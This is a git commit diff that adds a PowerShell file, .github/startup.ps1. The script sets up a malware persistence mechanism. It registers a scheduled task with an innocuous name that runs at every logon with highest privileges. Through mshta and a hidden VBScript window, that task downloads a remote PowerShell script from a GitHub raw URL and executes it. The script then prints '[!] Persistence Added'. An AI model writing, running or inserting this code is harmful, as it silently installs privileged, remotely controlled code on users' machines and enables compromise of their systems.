00bab21570ca010ab2fc96b0b28d352d6ac93cbd
43a1723 <hai1723notgay@gmail.com>
2024-09-24 12:30:59 +0700

    Create startup.ps1

---
+++ .github/startup.ps1
@@ -0,0 +1,6 @@
+$task_name = "Updated"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
+Write-Host "[!] Persistence Added" -ForegroundColor Green
